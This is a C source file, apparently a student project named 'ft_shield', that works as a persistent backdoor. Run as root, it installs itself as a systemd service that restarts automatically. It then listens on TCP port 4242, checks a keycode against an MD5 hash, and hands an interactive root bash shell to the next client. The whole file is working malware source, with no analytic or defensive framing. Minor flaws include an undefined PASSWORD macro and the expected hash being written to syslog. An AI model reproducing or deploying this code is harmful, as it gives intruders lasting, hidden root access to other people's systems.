#include <stdio.h>
#include <stdlib.h>
#include <sys/syslog.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <errno.h>
#include <syslog.h>
#include <crypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syslog.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdint.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/file.h>
#include <fcntl.h>
#include <syslog.h>
#include <linux/limits.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <sys/syslog.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

#define PORT 4242
#define BACKLOG 3
#define MAX_CLIENTS 3
#define LOCK_FILE_PATH "/var/lock/ft_shield.lock"
#define BUFFER_SIZE 1024
#define FT_SHIELD_SERVICE_PATH "/etc/systemd/system/ft_shield.service"

void sigchld_handler(int sig) {
    (void)sig;
    int saved_errno = errno;
    while (waitpid(-1, NULL, WNOHANG) > 0) {}
    errno = saved_errno;
}

typedef struct s_md5_ctx {
    uint32_t state[4];
    uint64_t bit_count;
    uint8_t buffer[64];
    size_t buffer_len;
} t_md5_ctx;

static uint32_t S[4 * 16] = {
    7,  12, 17, 22, 7,  12, 17, 22, 7,  12, 17, 22, 7,  12, 17, 22, 5,  9,  14, 20, 5,  9,
    14, 20, 5,  9,  14, 20, 5,  9,  14, 20, 4,  11, 16, 23, 4,  11, 16, 23, 4,  11, 16, 23,
    4,  11, 16, 23, 6,  10, 15, 21, 6,  10, 15, 21, 6,  10, 15, 21, 6,  10, 15, 21,
};

static uint32_t K[16 * 4] = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
};

static void MCopy(uint32_t *dest, const uint8_t *chunk, size_t chunk_len) {
    for (uint32_t index = 0; index < chunk_len / 4; index++) {
        dest[index] = (uint32_t)chunk[index * 4 + 0] | ((uint32_t)chunk[index * 4 + 1] << 8) |
                      ((uint32_t)chunk[index * 4 + 2] << 16) |
                      ((uint32_t)chunk[index * 4 + 3] << 24);
    }
}

static void encode_length(unsigned char *output, uint64_t input) {
    output[0] = (unsigned char)(input & 0xff);
    output[1] = (unsigned char)((input >> 8) & 0xff);
    output[2] = (unsigned char)((input >> 16) & 0xff);
    output[3] = (unsigned char)((input >> 24) & 0xff);
    output[4] = (unsigned char)((input >> 32) & 0xff);
    output[5] = (unsigned char)((input >> 40) & 0xff);
    output[6] = (unsigned char)((input >> 48) & 0xff);
    output[7] = (unsigned char)((input >> 56) & 0xff);
}

static void encode_digest(uint8_t digest[16], uint32_t a, uint32_t b, uint32_t c, uint32_t d) {
    uint32_t states[4] = {a, b, c, d};

    for (int i = 0; i < 4; i++) {
        digest[i * 4 + 0] = (uint8_t)(states[i] & 0xFF);
        digest[i * 4 + 1] = (uint8_t)((states[i] >> 8) & 0xFF);
        digest[i * 4 + 2] = (uint8_t)((states[i] >> 16) & 0xFF);
        digest[i * 4 + 3] = (uint8_t)((states[i] >> 24) & 0xFF);
    }
}

static void digest_to_hex(const uint8_t digest[16], char output[33]) {
    for (int i = 0; i < 16; i++)
        sprintf(&output[i * 2], "%02x", digest[i]);

    output[32] = '\0';
}

static void md5_init(t_md5_ctx *context) {
    context->state[0] = 0x67452301;
    context->state[1] = 0xefcdab89;
    context->state[2] = 0x98badcfe;
    context->state[3] = 0x10325476;
    context->bit_count = 0;
    context->buffer_len = 0;
}

static void md5_transform(t_md5_ctx *context, const uint8_t block[64]) {
    uint32_t A = context->state[0];
    uint32_t B = context->state[1];
    uint32_t C = context->state[2];
    uint32_t D = context->state[3];
    uint32_t M[16];

    MCopy(M, block, 64);
    for (int i = 0; i < 64; i++) {
        uint32_t F, g;

        if (i >= 0 && i <= 15) {
            F = (B & C) | (~B & D);
            g = i;
        } else if (i >= 16 && i <= 31) {
            F = ((D & B)) | (~D & C);
            g = (5 * i + 1) % 16;
        } else if (i >= 32 && i <= 47) {
            F = B ^ C ^ D;
            g = (3 * i + 5) % 16;
        } else if (i >= 48 && i <= 63) {
            F = C ^ (B | ~D);
            g = (7 * i) % 16;
        }
        F = F + A + K[i] + M[g];
        A = D;
        D = C;
        C = B;
        B = B + ((F << S[i]) | (F >> (32 - S[i])));
    }
    context->state[0] += A;
    context->state[1] += B;
    context->state[2] += C;
    context->state[3] += D;
}

static void md5_update(t_md5_ctx *context, const uint8_t *input, size_t input_len) {
    size_t i = 0;

    context->bit_count += (uint64_t)input_len * 8;
    while (i < input_len) {
        size_t space = 64 - context->buffer_len;
        size_t take = (input_len - i < space) ? input_len - i : space;

        memcpy(context->buffer + context->buffer_len, input + i, take);
        i += take;
        context->buffer_len += take;
        if (context->buffer_len == 64) {
            md5_transform(context, context->buffer);
            context->buffer_len = 0;
        }
    }
}

static void md5_final(t_md5_ctx *context, unsigned char digest[16]) {
    uint8_t one = 0x80;
    uint8_t zero = 0x00;
    uint8_t length_bytes[8];
    uint64_t original_bit_count = context->bit_count;

    md5_update(context, &one, 1);

    while (context->buffer_len != 56)
        md5_update(context, &zero, 1);

    encode_length(length_bytes, original_bit_count);
    md5_update(context, length_bytes, 8);
    encode_digest(digest, context->state[0], context->state[1], context->state[2],
                  context->state[3]);
}

void md5_str(char *message, char output[33]) {
    t_md5_ctx ctx;
    unsigned char digest[16];

    md5_init(&ctx);
    md5_update(&ctx, (uint8_t *)message, strlen(message));
    md5_final(&ctx, digest);
    digest_to_hex(digest, output);
}

int acquire_lock(const char *path)
{
    int fd = open(path, O_CREAT | O_RDWR, 0644);
    if (fd < 0) return -1;
    if (flock(fd, LOCK_EX | LOCK_NB) != 0) {
        close(fd);
        return -1;
    }
    char buf[32];
    int len = snprintf(buf, sizeof(buf), "%d\n", getpid());
    ftruncate(fd, 0);
    write(fd, buf, len);
    return fd;
}

void refresh_pid(int fd) {
    if (fd < 0)
        return;
    if (ftruncate(fd, 0) < 0) {
        return;
    }
    lseek(fd, 0, SEEK_SET);
    int pid = getpid();
    char buf[12];
    int len = snprintf(buf, sizeof(buf), "%d", pid);
    write(fd, buf, len);
}

/*
** Shared state between parent (accept loop) and forked children.
** Allocated with mmap(MAP_SHARED) so writes are visible across processes.
*/
typedef struct s_shared {
    int shell_mode;
    int n_clients;
} t_shared;

static t_shared *g_shared;

static void spawn_shell(int cfd) {
    g_shared->shell_mode = 0;
    dup2(cfd, STDIN_FILENO);
    dup2(cfd, STDOUT_FILENO);
    dup2(cfd, STDERR_FILENO);
    close(cfd);
    chdir("/");
    execl("/bin/bash", "bash", "-i", NULL);
    _exit(1);
}

static int authenticate(int cfd) {
    char buf[4096];
    ssize_t n;

    while (1) {
        write(cfd, "Keycode: ", 9);
        n = read(cfd, buf, sizeof(buf) - 1);
        if (n <= 0)
            return 0;
        if (n > 0 && buf[n - 1] == '\n') n--;
        if (n > 0 && buf[n - 1] == '\r') n--;
        buf[n] = '\0';

        char hash[33];
        md5_str(buf, hash);
        syslog(LOG_INFO, "auth attempt: hash=[%s] expected=[%s]", hash, PASSWORD);
        if (strcmp(hash, PASSWORD) == 0)
            return 1;
    }
}

static void command_loop(int cfd) {
    char buf[4096];
    ssize_t n;

    while (1) {
        write(cfd, "$> ", 3);
        n = read(cfd, buf, sizeof(buf) - 1);
        if (n <= 0)
            break;
        buf[n] = '\0';

        if (strcmp(buf, "?\n") == 0 || strcmp(buf, "?\r\n") == 0) {
            const char *help =
                "? show help\n"
                "shell Spawn remote shell on 4242\n";
            write(cfd, help, strlen(help));
        } else if (strcmp(buf, "shell\n") == 0 || strcmp(buf, "shell\r\n") == 0) {
            const char *msg = "Spawning shell on port 4242\n";
            write(cfd, msg, strlen(msg));
            g_shared->shell_mode = 1;
            break;
        } else if (strcmp(buf, "\n") != 0 && strcmp(buf, "\r\n") != 0) {
            write(cfd, "unknown command\n", 16);
        }
    }
}

static void handle_client(int cfd) {
    if (g_shared->shell_mode) {
        spawn_shell(cfd);
    }
    if (g_shared->n_clients >= MAX_CLIENTS) {
        write(cfd, "too many clients\n", 17);
        close(cfd);
        _exit(0);
    }
    if (!authenticate(cfd)) {
        close(cfd);
        _exit(0);
    }
    g_shared->n_clients++;
    syslog(LOG_INFO, "client authenticated (n_clients=%d)", g_shared->n_clients);
    command_loop(cfd);
    g_shared->n_clients--;
    close(cfd);
    _exit(0);
}

int launch_server() {
    int server_fd;
    struct sockaddr_in addr;

    /* Allocate shared memory for shell_mode and n_clients */
    g_shared = mmap(NULL, sizeof(t_shared), PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_shared == MAP_FAILED) {
        syslog(LOG_ERR, "mmap failed: %s", strerror(errno));
        return 1;
    }
    g_shared->shell_mode = 0;
    g_shared->n_clients = 0;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        syslog(LOG_ERR, "socket failed: %s", strerror(errno));
        return 1;
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof opt);

    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof addr) < 0) {
        syslog(LOG_ERR, "bind failed: %s", strerror(errno));
        return 1;
    }

    if (listen(server_fd, BACKLOG) < 0) {
        syslog(LOG_ERR, "listen failed: %s", strerror(errno));
        return 1;
    }

    syslog(LOG_INFO, "listening on port %d", PORT);
    signal(SIGCHLD, sigchld_handler);

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof client_addr;
        int cfd = accept(server_fd,
                         (struct sockaddr *)&client_addr,
                         &client_len);
        if (cfd < 0) {
            if (errno == EINTR)
                continue;
            syslog(LOG_ERR, "accept failed: %s", strerror(errno));
            continue;
        }

        pid_t pid = fork();
        if (pid == 0) {
            close(server_fd);
            handle_client(cfd);
        }
        close(cfd);
    }
    close(server_fd);
    return 0;
}

int daemonize(void) {
    openlog("ft_shield_server", LOG_PID | LOG_CONS, LOG_DAEMON);
    syslog(LOG_INFO, "ft_shield_server is starting, pid=%d", getpid());
    int fd = acquire_lock(LOCK_FILE_PATH);
    if (fd < 0) {
        syslog(LOG_ERR, "another instance is running or lock failed");
        closelog();
        exit(EXIT_FAILURE);
    }
    pid_t pid = fork();
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    if (pid < 0) {
        syslog(LOG_ERR, "fork() failed: %s", strerror(errno));
        return -1;
    }
    umask(0);
    if (setsid() < 0) {
        syslog(LOG_ERR, "setsid() failed: %s", strerror(errno));
        closelog();
        return -1;
    }
    refresh_pid(fd);
    syslog(LOG_INFO, "daemonized, pid=%d", getpid());
    launch_server();
    return 0;
}

int installer_mode(char* self) {
    const char *p = "[Unit]\nDescription=ft_shield service\nAfter=network.target\n[Service]\ntype=forking\nPIDFile=/var/lock/ft_shield.lock\nExecStart=/usr/bin/ft_shield\nRestart=always\nUser=root\n[Install]\nWantedBy=multi-user.target\n";
    (void) p;
    umask(0);
    if (getuid()) {
        printf("ft_shield needs root privileges\n");
        return (EXIT_FAILURE);
    }
    char *buffer = malloc(sizeof(char) * BUFFER_SIZE);
    if (buffer == NULL) {
        return 1;
    }
    size_t buffer_size = BUFFER_SIZE;
    getlogin_r(buffer, buffer_size);
    printf("%s\n", buffer);
    int fd = open(FT_SHIELD_SERVICE_PATH, O_CREAT | O_WRONLY, 0644);
    if (fd < 0) {
        return -1;
    }
    write(fd, p, strlen(p));

    int self_file = open(self, O_RDONLY);
    if (self_file < 0) {
        printf("self_file creation has failed\n");
        return -1;
    }

    int copied = open("/bin/ft_shield", O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (copied < 0) {
        printf("copied creation has failed\n");
        return -1;
    }

    char buf[BUFSIZ+1];
    ssize_t n = 0;
    while ((n = read(self_file, buf, BUFSIZ)) > 0) {
        buf[n] = '\0';
        if ((write(copied, buf, n)) == -1) {
            perror("write");
            exit(1);
        }
    }
    if (n == -1) {
        perror("read");
        exit(1);
    }

    close(self_file);
    close(copied);

    int ret = system("systemctl daemon-reload;systemctl enable ft_shield;systemctl start ft_shield");
    if (ret < 0)
        return -1;

    return 0;
}

int main() {
    char self[PATH_MAX];
    ssize_t len;
    len = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (len == -1) {
        return 2;
    }
    self[len] = '\0';
    if (strcmp(self, "/usr/bin/ft_shield") == 0) {
        return daemonize();
    } else {
        return installer_mode(self);
    }
    return (0);
}
